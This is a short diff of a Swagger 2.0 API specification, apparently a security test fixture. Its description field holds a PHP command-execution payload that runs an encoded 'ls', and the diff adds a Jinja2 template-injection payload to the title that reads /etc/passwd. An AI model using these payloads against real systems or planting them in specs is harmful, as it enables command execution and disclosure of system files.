@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   description: echo system(chr(0x6c).chr(0x73));
   version: 1.0.0
-  title: C
+  title: {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 produces:
   - application/json
 consumes:
